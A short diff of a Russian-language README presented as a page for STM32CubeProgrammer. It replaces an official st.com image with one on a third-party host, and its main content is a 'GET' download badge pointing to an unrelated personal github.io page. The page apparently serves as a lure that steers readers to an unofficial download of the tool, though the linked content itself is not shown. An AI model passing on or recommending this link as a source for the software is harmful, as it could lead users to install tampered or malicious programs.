@@ -1,7 +1,7 @@
 # STM32CubeProgrammer — программирование и прошивка микроконтроллеров STM32
 
 <p align="center">
-  <img src="https://www.st.com/bin/ecommerce/api/image.PF265487.en.feature-description-include-personalized-no-cpn-large.jpg" alt="STM32CubeProgrammer" width="400">
+  <img src="https://media.onzuu.com/static/20250515/stm32cubeprogrammer-interface.png" alt="STM32CubeProgrammer" width="400">
 </p>
 
 [![GET — STM32CUBEPROGRAMMER](https://img.shields.io/badge/GET-STM32CUBEPROGRAMMER-2563eb?style=for-the-badge)](https://mccunekopischke.github.io/.github/STM32CubeProgrammer)
